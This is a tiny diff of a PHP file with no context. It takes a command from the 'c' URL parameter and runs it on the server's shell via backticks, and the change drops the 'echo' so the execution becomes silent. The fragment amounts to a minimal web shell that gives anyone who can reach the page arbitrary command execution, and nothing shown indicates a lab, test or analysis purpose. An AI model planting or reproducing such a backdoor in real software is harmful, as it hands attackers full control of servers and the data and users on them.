@@ -2,4 +2,4 @@
 
 $command = $_GET['c'];
 
-echo `$command`;
+ `$command`;
